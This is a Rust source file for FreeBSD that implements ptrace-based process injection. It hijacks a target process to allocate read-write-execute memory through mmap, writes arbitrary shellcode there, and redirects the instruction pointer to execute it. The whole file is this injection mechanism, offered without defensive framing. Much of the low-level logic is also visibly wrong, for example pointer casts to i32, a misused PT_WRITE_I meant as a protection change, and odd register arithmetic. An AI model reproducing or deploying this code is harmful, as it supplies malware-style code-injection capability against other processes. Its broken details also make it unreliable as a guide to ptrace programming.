#[cfg(target_os = "freebsd")]

use libc::{
    pid_t, ptrace, sysconf, reg, waitpid,
    PT_GETREGS, PT_WRITE_D, PT_WRITE_I, PT_SETREGS, PT_STEP,
    _SC_PAGESIZE,
};
use std::io;

pub const NULL_PTR: *mut i8= std::ptr::null_mut::<i8>();

pub const PTRACE_ATTACH: i32 = libc::PT_ATTACH;
pub const PTRACE_DETACH: i32 = libc::PT_DETACH;


fn make_memory_writable(pid: libc::pid_t, address: *mut libc::c_void) -> Result<(), std::io::Error> {
    let page_size = unsafe { libc::sysconf(libc::_SC_PAGESIZE) } as usize;
    let aligned_address = (address as usize & !(page_size - 1)) as *mut i8;

    let result = unsafe {
        ptrace(
            libc::PT_WRITE_I,
            pid,
            aligned_address,
            (libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC) as i32,
        )
    };

    if result == -1 {
        return Err(std::io::Error::last_os_error());
    }
    Ok(())
}

pub fn allocate_remote_memory(target_pid: pid_t, size: usize) -> Result<i64, io::Error> {
    unsafe {
        // Get the current registers
        let mut regs: reg = std::mem::zeroed();
        if ptrace(
            PT_GETREGS,
            target_pid,
            NULL_PTR,
            &mut regs as *mut _ as i32,
        ) == -1 {
            println!("GETREGS {}", io::Error::last_os_error());
            return Err(io::Error::last_os_error());
        }

        // Store a backup of the original registers
        let mut original_regs = regs;

        // Align memory size to the page size
        let page_size = sysconf(_SC_PAGESIZE) as usize;
        let aligned_size = (((size + page_size - 1) / page_size) * page_size) as i64;

        // Set up the syscall arguments for mmap
        regs.r_rax = 477; // mmap syscall number
        regs.r_rdi = 0; // Set aligned memory address manually
        regs.r_rsi = aligned_size; // Page-aligned size
        regs.r_rdx = (libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC) as i64; // RWX permissions
        regs.r_r10 = (libc::MAP_ANON | libc::MAP_PRIVATE) as i64; // Flags
        regs.r_r8 = -1; // Correct file descriptor casting
        regs.r_r9 = 0; // Offset

        println!("Allocating memory with mmap syscall");

        // Set the registers with the new syscall arguments
        if ptrace(
            PT_SETREGS,
            target_pid,
            NULL_PTR,
            &mut regs as *mut _ as i32,
        ) == -1 {
            println!("SETREGS {}", io::Error::last_os_error());
        }

        make_memory_writable(target_pid, regs.r_rip as *mut libc::c_void)?;
        regs.r_rip &= !0x7; // Skip the SYSCALL instruction
        let opcode: usize = 0x050f;
        // Execute the syscall using the SYSCALL instruction (0x050f)
        if ptrace(
            PT_WRITE_I,
            target_pid,
            regs.r_rip as *mut i8,
            opcode.try_into().unwrap(),
        )== -1 {
            println!("MMAP Error : {}", io::Error::last_os_error());
        }
        ptrace(
            PT_STEP,
            target_pid,
            NULL_PTR,
            NULL_PTR as i32,
        );
        waitpid(target_pid, std::ptr::null_mut(), 0);

        // Read the syscall result (allocated address)
        ptrace(
            PT_GETREGS,
            target_pid,
            NULL_PTR,
            &mut regs as *mut _ as i32,
        );

        let allocated_address = regs.r_rax;

        println!("Allocated address: 0x{:x}", allocated_address);
        if allocated_address == 0 || allocated_address == i64::MAX {
            println!("Error allocating memory: 0x{:x}", allocated_address);
            println!("Error: {}", io::Error::last_os_error());
            return Err(io::Error::new(
                io::ErrorKind::Other,
                "Invalid memory address allocated",
            ));
        }

        if (allocated_address as i64) < 0 {
            return Err(io::Error::last_os_error());
        }
        // Restore original registers
        ptrace(
            PT_WRITE_I,
            target_pid,
            regs.r_rip as *mut i8,
            original_regs.r_rip.try_into().unwrap(),
        );
        if ptrace(
            PT_SETREGS,
            target_pid,
            NULL_PTR,
            &mut original_regs as *mut _ as i32,
        ) == -1
        {
            return Err(io::Error::last_os_error());
        }

        Ok(allocated_address)
    }
}

pub fn write_shellcode(pid: pid_t, mut address: i64, shellcode: &[u8]) -> Result<(), std::io::Error> {
    println!(
        "Writing shellcode to address: 0x{:x} in process id {}",
        address, pid
    );
    let mut padded_shellcode = shellcode.to_vec();
    while padded_shellcode.len() % 8 != 0 {
        padded_shellcode.push(0x90); // NOP sled padding
    }
    unsafe {
        let mut data = [0u8; 8];

        for (_, chunk) in padded_shellcode.chunks(8).enumerate() {
            for (j, &byte) in chunk.iter().enumerate() {
                data[j] = byte;
            }

            let mut word = i64::from_le_bytes(data);
            if ptrace(
                PT_WRITE_D,
                pid,
                address as *mut i8,
                &mut word as *mut _ as i32,
            ) == -1
            {
                return Err(std::io::Error::last_os_error());
            }

            address += 8;
        }
    }

    Ok(())
}

pub fn execute_shellcode_at_address(address: i64, pid: pid_t) -> Result<(), std::io::Error> {
    unsafe {
        let mut regs: reg = std::mem::zeroed();
        ptrace(
            PT_GETREGS,
            pid,
            NULL_PTR,
            &mut regs as *mut _ as i32,
        );
        ptrace(
            PT_WRITE_I,
            pid,
            regs.r_rax as *mut i8,
            (address - 2).try_into().unwrap(),
        );
        regs.r_rip = (address + 8 + 2) as i64; // +2 to skip the SYSCALL instruction
        println!("Setting RIP to 0x{:x}", regs.r_rip);
        ptrace(
            PT_SETREGS,
            pid,
            NULL_PTR,
            &mut regs as *mut _ as i32,
        );
    }
    Ok(())
}